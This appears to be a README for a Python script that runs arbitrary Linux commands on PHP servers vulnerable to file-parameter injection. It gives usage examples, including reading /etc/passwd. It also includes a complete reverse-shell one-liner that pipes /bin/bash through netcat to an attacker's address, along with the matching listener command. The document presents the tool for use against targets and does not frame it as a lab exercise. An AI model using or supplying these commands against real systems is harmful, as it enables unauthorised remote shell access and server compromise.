Description
This python script allows you to execute linux commands on a vulnerable php server. It works on urls susceptible to php traversal attack with something like: 
# "http://www.example.com/site/index.php?file="
By adding linux commands like: whoami, ls, cat /etc/passwd etc to "file=", response is displayed from the server on the page. 
# eg. "http://www.example.com/site/index.php?file=whoami"
# -> www-server

In the MakeRequest() function, the
# data = {
#        'file': command
#    } 
command is the command user wants to execute on the target. 

Example:
# python3 remote_command.py <target IP> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker's IP(10.0.2.3)> <attacker's port(443)> >/tmp/f"

Netcat should be listening on the attacker's end like: 
# nc -nvlp 443

Requirement
# pip install requests

Usage
# python3 remote_command.py [host] [command]
